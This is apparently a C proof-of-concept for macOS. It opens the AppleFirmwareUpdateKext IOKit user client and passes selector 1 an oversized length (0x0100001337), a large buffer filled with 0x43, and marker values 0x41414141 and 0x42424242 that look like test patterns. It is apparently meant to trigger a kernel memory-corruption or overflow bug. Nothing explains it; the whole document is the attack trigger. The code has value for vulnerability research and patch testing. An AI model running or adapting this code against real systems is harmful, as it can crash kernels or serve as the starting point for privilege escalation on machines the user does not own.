#include <stdio.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;

kern_return_t IOServiceOpen(io_service_t service, task_t task, uint32_t type, io_connect_t *client);
io_service_t IOServiceGetMatchingService(mach_port_t master, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
kern_return_t IOConnectCallScalarMethod(io_connect_t client, uint32_t selector, const uint64_t *in, uint32_t inCnt, uint64_t *out, uint32_t *outCnt);

int main(){
	io_connect_t client = MACH_PORT_NULL;
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleFirmwareUpdateKext"));
	IOServiceOpen(service, mach_task_self(), 0, &client);

	uint64_t classLength  = 0x0100001337;
	uint64_t bufferLength = classLength + 1;
	void *address = malloc(bufferLength);
	if (!address){
		printf("Couldn't allocate buffer, probably lack of RAM\n");
		return -1;
	}
	memset(address, 0x43, bufferLength);
	uint64_t buf[5] = {0};
	buf[0] = (uint64_t)address;
	buf[1] = bufferLength;
	buf[2] = classLength;
	buf[3] = 0x41414141;
	buf[4] = 0x42424242;

	int ret = IOConnectCallScalarMethod(client, 1, buf, 5, 0, 0);
	printf("ret %X %s\n", ret, mach_error_string(ret));
	if (ret == 1)
		printf("Couldn't create IOMD, probably lack of RAM\n");
	return ret;
}